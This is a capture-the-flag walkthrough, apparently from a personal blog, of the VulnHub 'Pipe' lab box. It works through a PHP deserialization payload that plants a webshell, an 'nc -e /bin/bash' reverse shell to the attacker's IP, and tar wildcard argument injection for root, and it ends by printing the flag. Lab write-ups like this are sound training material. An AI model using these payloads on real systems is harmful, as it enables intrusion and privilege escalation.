---
layout: post
title: VulnHub Pipe Walkthrough
categories: VulnHub
---

# Explanation
<a href="https://www.vulnhub.com/">VulnHub</a> is a website which has a bunch of vulnerable machines as virtual images.<br>
This is a walkthrough of a box `Pipe` series of `/dev/random`.

# Solution
## 1. Initial Enumeration
### Finding the target host
```shell
root@kali:/home/1n4r1# nmap -sP 192.168.0.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 21:50 EEST
Nmap scan report for 192.168.0.2
Host is up (0.000046s latency).
MAC Address: 08:00:27:A4:6E:F0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.3
Host is up (0.00030s latency).
MAC Address: 08:00:27:EB:BE:43 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.11 seconds
```

### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 192.168.0.3 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-28 21:57 EEST
Nmap scan report for 192.168.0.3
Host is up (0.00017s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
|   256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
|_  256 7b:00:f7:dc:31:24:18:cf:e4:0a:ec:7a:32:d9:f6:a2 (ED25519)
80/tcp    open  http    Apache httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=index.php
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40125/tcp6  status
|   100024  1          46298/udp   status
|   100024  1          47711/udp6  status
|_  100024  1          51770/tcp   status
51770/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:EB:BE:43 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
```

## 2. Getting User

Looks we have 401 error on the port 80.<br>
On the other side, if we try to use undefined HTTP method, we can access to the hidden content.
1. There is one javascript loaded `scriptz/php.js`
2. Serialized PHP object is created and POSTed to `index.php`.

```shell
root@kali:~# curl -X GETS http://192.168.0.3/index.php

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<script src="scriptz/php.js"></script>
<script>
function submit_form() {
var object = serialize({id: 1, firstname: 'Rene', surname: 'Margitte', artwork: 'The Treachery of Images'}); 
object = object.substr(object.indexOf("{"),object.length);
object = "O:4:\"Info\":4:" + object;
document.forms[0].param.value = object;
document.getElementById('info_form').submit();
}
</script> 
<title>The Treachery of Images</title>
</head>
<h1><i>The Treachery of Images</i></h1>
<hr />
From Wikipedia, the free encyclopedia
<br />
<br />
The Treachery of Images (French: La trahison des images, 1928–29, sometimes translated as The Treason of Images) is a painting by the Belgian surrealist painter René Magritte, painted when Magritte was 30 years old. The picture shows a pipe. Below it, Magritte painted, "Ceci n'est pas une pipe." [sə.si ne paz‿yn pip], French for "This is not a pipe."
<p>
"The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it's just a representation, is it not? So if I had written on my picture 'This is a pipe', I'd have been lying!"
</p>
His statement is taken to mean that the painting itself is not a pipe. The painting is merely an image of a pipe. Hence, the description, "this is not a pipe." The theme of pipes with the text "Ceci n'est pas une pipe" is extended in his 1966 painting, Les Deux Mystères. It is currently on display at the Los Angeles County Museum of Art.
The painting is sometimes given as an example of meta message conveyed by paralanguage. Compare with Korzybski's "The word is not the thing" and "The map is not the territory".
<br />
<br />
<center><div style="width:500px;overflow:hidden;" >
   <img src="images/pipe.jpg" width="400px" height="auto" border="1">
</div>
<form action="index.php" id="info_form" method="POST">
   <input type="hidden" name="param" value="" />
   <a href="#" onclick="submit_form(); return false;">Show Artist Info.</a>
</form></center></html>
```

Then, take a look at `192.168.0.3/scriptz`.<br>
We have file listing.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-13-53-12.png)

`php.js` is for the definition of a function `serialize()` used on `index.php`.<br>
On the other hand, log.php.BAK is for `Log` class.
```php:log.php.BAK
root@kali:~# curl http://192.168.0.3/scriptz/log.php.BAK
<?php
class Log
{
    public $filename = '';
    public $data = '';

    public function __construct()
    {
        $this->filename = '';
	$this->data = '';
    }

    public function PrintLog()
    {
        $pre = "[LOG]";
	$now = date('Y-m-d H:i:s');

        $str = '$pre - $now - $this->data';
        eval("\$str = \"$str\";");
        echo $str;
    }

    public function __destruct()
    {
	file_put_contents($this->filename, $this->data, FILE_APPEND);
    }
}
?>
```

Using Burp Suite, we can see the content of the hidden webpage on GUI.<br>
It is just a simple website with one hyperlink. Clicking the link shows us an interesting HTTP POST request with parameter.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-48.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)

Using Burp Decoder, we can decode the parameter.<br>
It's a PHP object of `Info` class.
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-14-25-29.png)
```shell
param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D
```
```shell
param=O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}
```

The `Log` class has `__destruct()` function which outputs a file.<br>
Intercepting the POST request and sending this parameter, we can upload a webshell `shell.php`.
```shell
param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" <?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}
```
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-15-40-21.png)
![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2020-05-02/2020-05-01-15-38-20.png)

Using `curl` with GET parameter, we can see that we have uploaded our webshell successfully.
```shell
root@kali:~# curl http://192.168.0.3/scriptz/shell.php?cmd=id
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

Then, run the following command. We have to fill out the space with `%20`.
```shell
root@kali:~# curl http://192.168.0.3/scriptz/shell.php?cmd=nc%20-e%20/bin/bash%20192.168.0.1%204444
```

Now we got a user shell as `www-data`.
```shell
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.0.1] from (UNKNOWN) [192.168.0.3] 59721
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@pipe:/var/www/html/scriptz$ 
```

## 3. Getting Root

By taking a look at `/etc/crontab`, we can find that 
1. `/root/create_backup` is running in every minutes.
2. `/usr/bin/compress.sh` is running in every 5 minutes as `root` user.

```shell
www-data@pipe:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh
```

The following is the content of `compress.sh`.<br>
We can find out that root runs `tar` command with wildcard.
```shell
www-data@pipe:/tmp$ cat /usr/bin/compress.sh
cat /usr/bin/compress.sh
#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
```

In `/home/rene/backup`, we have some backup files already.
```shell
www-data@pipe:/home/rene/backup$ ls -l 
ls -l
total 152
-rw-r--r-- 1 rene rene 120617 May  2 00:15 backup.tar.gz
-rw-r--r-- 1 rene rene  20865 May  2 00:16 sys-25110.BAK
-rw-r--r-- 1 rene rene   3138 May  2 00:17 sys-25916.BAK
-rw-r--r-- 1 rene rene   3906 May  2 00:18 sys-3225.BAK
```

By creating a file named `--checkpoint-action=command` and `--checkpoint=number`, we can inject the argument of `tar` command.
```shell
www-data@pipe:/home/rene/backup$ echo "chmod u+s /usr/bin/find" > shell.sh
echo "chmod u+s /usr/bin/find" > shell.sh
www-data@pipe:/home/rene/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
<ckup$ echo "" > "--checkpoint-action=exec=sh shell.sh"                      
www-data@pipe:/home/rene/backup$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
```

`compress.sh` is ran in every 5 minutes.<br>
We can confirm that we added SUID to `/usr/bin/find`.
```shell
www-data@pipe:/home/rene/backup$ ls -l /usr/bin/find
ls -l /usr/bin/find
-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find
```

Since `find` has `-exec` option, we can execute `/bin/sh` as root user.
```shell
www-data@pipe:/home/rene/backup$ find backup.tar.gz -exec "/bin/sh" \;
find backup.tar.gz -exec "/bin/sh" \;
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
```

`root.txt` is in the directory `/root`.
```shell
# cat /root/flag.txt
cat /root/flag.txt
                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc*YMMn.    `Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM `*YMMY*ccaM*
                                                              dM*  *YMMb  YP        `cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               *YMMn.     aMMMMMMMMMMMY'
                                                                .'YMMb.           ccMP
                                                             .dMcccccc*Mc....cMb.cMP'
                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
                                                          dY*'  '*M;ccccMM..dMMM..MP*cc*Mb
                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
                                                          Yb;cc;dMMMMMMMMMMMP*'  *YMMP*
                                                           *YMMMPYMMMMMMP*'          curchack
                                                       +####################################+
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       +----------------------------------+-+
                                                        ####################################
                                                             |======                  |
                                                             |======                  |
                                                             |=====                   |
                                                             |====                    |
                                                             |                        |
                                                             +                        +
 .d8888b.                 d8b          d8b               888                                                                    d8b
d88P  Y88b                Y8P          88P               888                                                                    Y8P
888    888                             8P                888
888        .d88b.  .d8888b888   88888b."  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
888       d8P  Y8bd88P"   888   888 "88b d8P  Y8b88K     888      888 "88b    "88b88K        888  888888 "88bd8P  Y8b   888 "88b888888 "88bd8P  Y8b
888    88888888888888     888   888  888 88888888"Y8888b.888      888  888.d888888"Y8888b.   888  888888  88888888888   888  888888888  88888888888
Y88b  d88PY8b.    Y88b.   888   888  888 Y8b.         X88Y88b.    888 d88P888  888     X88   Y88b 888888  888Y8b.       888 d88P888888 d88PY8b.   d8b
 "Y8888P"  "Y8888  "Y8888P888   888  888  "Y8888  88888P' "Y888   88888P" "Y888888 88888P'    "Y88888888  888 "Y8888    88888P" 88888888P"  "Y8888Y8P
                                                                  888                                                   888        888
                                                                  888                                                   888        888
                                                                  888                                                   888        888
Well Done!
Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7
```
